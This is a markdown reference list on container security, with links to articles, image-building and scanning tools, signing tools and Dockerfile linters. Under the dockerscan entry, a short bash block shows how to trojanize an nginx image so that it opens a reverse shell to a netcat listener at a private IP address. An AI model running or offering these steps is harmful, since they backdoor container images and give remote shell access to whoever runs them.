# Articles
* [Worst best practices on Docker](https://pythonspeed.com/articles/security-updates-in-docker/) and why you should update base images
* [Singularity](https://sylabs.io/guides/3.0/user-guide/quick_start.html) quick start / Single file based container
* [Understanding container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

# Tools
* [dockerscan](https://github.com/cr0hn/dockerscan) weaponize container images
```bash
docker save nginx:latest -o nginx-original
dockerscan image info nginx-original
dockerscan image analyze nginx-original
dockerscan image modify trojanize nginx-original -l 10.244.100.147 -p 2222 -o nginx-trojan
docker load -i nginx-trojan
# on remote
nc -v -k -l 10.244.100.147 2222
# run 
docker run ngimx:latest
# honk :)
```
* [syft](https://github.com/anchore/syft) generate software bill of materials of containers
* [build kit](https://hub.docker.com/r/docker/dockerfile/) cheat sheet
* [buildah](https://github.com/containers/buildah/tree/master/docs/tutorials)
* [dumb-init](https://github.com/Yelp/dumb-init) - Process supervisor that runs with PID 1 and spawns other process inside the container. Handles signals. 
* [distroless](https://github.com/GoogleContainerTools/distroless)
* [google-base-image](https://github.com/GoogleContainerTools/base-images-docker) how google build images with reproducible builds
* [container-diff](https://github.com/GoogleContainerTools/container-diff)
* [dive](https://github.com/wagoodman/dive)
* [skopeo](https://github.com/containers/skopeo)

# Content Trust
* [Google's Cosign](https://github.com/sigstore/cosign)
* [Distroless + Cosign](https://security.googleblog.com/2021/05/making-internet-more-secure-one-signed.html)
* [Notary](https://docs.docker.com/notary/getting_started/)

## Dockerfile and CIS Benchmark
* [Hadolint](https://github.com/hadolint/hadolint) - tests Dockerfile
* [Dockle](https://github.com/goodwithtech/dockle) - tests images


## CVE
* [CVE List](https://www.container-security.site/general_information/container_cve_list.html)
